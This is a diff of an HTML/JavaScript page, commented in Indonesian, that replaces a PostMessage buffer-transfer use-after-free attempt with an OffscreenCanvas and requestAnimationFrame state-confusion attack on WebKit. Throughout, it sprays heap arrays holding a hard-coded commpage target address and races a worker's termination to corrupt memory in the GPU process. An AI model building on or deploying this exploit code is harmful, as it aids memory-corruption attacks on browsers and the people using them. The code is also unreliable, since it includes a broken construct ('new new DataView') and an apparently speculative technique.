@@ -1,13 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PostMessage Transfer Lifecycle Attack</title>
+    <title>OffscreenCanvas/rAF State Confusion Attack</title>
 </head>
 <body>
 
-    <h1>PostMessage Transfer UAF Attack (Commpage Target)</h1>
+    <h1>OffscreenCanvas/rAF State Confusion (Commpage Target)</h1>
+    <canvas id="mainCanvas"></canvas>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Worker dan Transfer...</p>
+    <p id="status">INIT: Mempersiapkan OffscreenCanvas dan rAF...</p>
     <div id="log"></div>
 
     <script>
@@ -20,7 +21,7 @@
         const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
         let worker = null;
-        let victimBuffer = null;
+        let mainCanvas = null;
         let payloadHolders = []; 
 
         function log(message) {
@@ -36,69 +37,77 @@
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
                 payloadArray[0] = HIGH_WORD; 
                 payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 1337.0 + i; 
+                payloadArray[2] = 2025.12 + i; 
                 payloadHolders.push(payloadArray); 
             }
             log(`Phase Spray: ${SPRAY_COUNT} Payload dimasukkan.`);
         }
 
+        // --- FUNGSI EKSEKUSI UTAMA rAF ---
+        function rAFCallback() {
+            // Callback ini berjalan tepat sebelum frame dirender.
+            // Kita gunakan ini untuk meyakinkan WebKit bahwa Canvas masih hidup, 
+            // padahal kita akan mencoba menghancurkannya.
+            
+            // 1. Memicu JIT/Heap Grooming di Timing Paling Kritis
+            sprayPayload(); 
+            
+            // 2. Memicu Dereference pada Objek yang Dicurigai Corrupt
+            if (mainCanvas) {
+                try {
+                    // Memicu operasi grafis yang kompleks
+                    let ctx = mainCanvas.getContext('2d');
+                    ctx.fillStyle = `rgb(${LOW_WORD & 0xFF}, ${HIGH_WORD & 0xFF}, 0)`; 
+                    ctx.fillRect(0, 0, 10, 10);
+                    
+                    // Trigger final: Akses properti objek yang mungkin ditimpa
+                    let data = ctx.getImageData(0, 0, 1, 1).data;
+                    let crashValue = data[0] + data[1]; 
+
+                } catch(e) {
+                    log("JS Error/Crash Trigger: " + e.message);
+                }
+            }
+            // Lanjutkan rAF sampai crash terjadi
+            window.requestAnimationFrame(rAFCallback); 
+        }
+
+
         // --- FUNGSI UTAMA ATTACK ---
-        function runTransferAttack() {
-            log("Phase 1: Membuat Objek Korban dan Worker.");
-            
-            // 1. Objek Korban (Victim Buffer)
-            // ArrayBuffer adalah objek yang dapat ditransfer (ownership berpindah)
-            victimBuffer = new ArrayBuffer(512); 
-            let victimView = new new DataView(victimBuffer);
-            victimView.setUint32(0, 0xBBBBBBBB, true); // Pola unik
+        function runCanvasAttack() {
+            mainCanvas = document.getElementById('mainCanvas');
+            const offscreen = mainCanvas.transferControlToOffscreen();
 
-            // 2. Worker (Attacker Thread)
-            worker = new Worker('worker_transfer.js');
-            worker.postMessage({ cmd: 'setup' });
+            log("Phase 1: Transfer Control ke OffscreenWorker.");
+            worker = new Worker('worker_canvas.js');
 
-            // 3. Memicu Transfer dan UAF Race
-            log("Phase 2: Memicu Transfer Buffer dan Lifecycle Confusion...");
-            
-            // Waktu Kritis: Transfer (perpindahan pointer C++ antar thread)
-            worker.postMessage({ cmd: 'transfer', buffer: victimBuffer, low: LOW_WORD, high: HIGH_WORD }, [victimBuffer]);
-            
-            // Setelah dipostMessage, victimBuffer menjadi "detached" (diputus/invalid) di thread utama.
-            // Pointer C++-nya sekarang sedang dalam proses penanganan oleh Worker.
+            // Kirim OffscreenCanvas ke Worker untuk dimanipulasi
+            worker.postMessage({ cmd: 'start', canvas: offscreen }, [offscreen]);
 
-            // 4. Trigger Race dan Corrupt Destructor
-            // HENTIKAN Worker segera setelah transfer dipost. Ini memaksa C++ WebKit 
-            // untuk membersihkan thread Worker dan objek yang sedang diproses.
+            // 2. Memicu rAF (Timer Kritis)
+            window.requestAnimationFrame(rAFCallback);
+            log("Phase 2: rAF Callback Aktif.");
+
+            // 3. Memicu Corrupt State (Mempercepat Worker Terminate)
+            // Kita coba terminasi Worker saat ia sedang memproses Canvas
             setTimeout(() => {
-                log("Phase 3: TERMINATE Worker (Memaksa Destructor Cleanup!).");
+                log("Phase 3: TERMINATE Worker (Memaksa UAF di GPU Thread!).");
                 worker.terminate();
                 
-                // Lakukan spray di thread utama, berharap menimpa memori yang baru di-free oleh terminate
-                sprayPayload();
-                
-                // Trigger UAF (Akses victimBuffer yang sudah detached/freed)
-                log("Phase 4: Mencoba Trigger UAF pada Buffer yang Detached/Freed...");
-                try {
-                    // Akses properti view pada buffer yang sudah ditransfer (detached) dan kemudian di-free oleh terminate.
-                    let check = victimView.getUint32(0, true); 
-                    log(`Dereference: Nilai dibaca dari buffer lama: 0x${check.toString(16)}`);
-                    
-                    // Jika tidak crash, coba alokasi objek baru yang menimpa memori lama
-                    let attackerView = new DataView(new ArrayBuffer(512));
-                    let finalRead = attackerView.getUint32(0, true);
-                    
-                    log(`Final Read: 0x${finalRead.toString(16)}`);
-                    
-                } catch (e) {
-                    log("JS Error: " + e.message + " - Menunggu Segfault OS.");
-                }
-
-            }, 50); // Jarak waktu yang sangat singkat untuk memicu race
+                // Hapus referensi untuk membantu GC (diperlukan)
+                worker = null; 
+            }, 100); 
+            
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian Transfer UAF...';
-            setTimeout(runTransferAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah UAF Antar-Thread.';
+             if (!window.OffscreenCanvas) {
+                 document.getElementById('status').textContent = 'Gagal: OffscreenCanvas tidak didukung.';
+                 return;
+             }
+             document.getElementById('status').textContent = 'Memulai rangkaian OffscreenCanvas Attack...';
+             setTimeout(runCanvasAttack, 50);
+             document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah UAF/Confusion di GPU Process.';
         });
 
     </script>
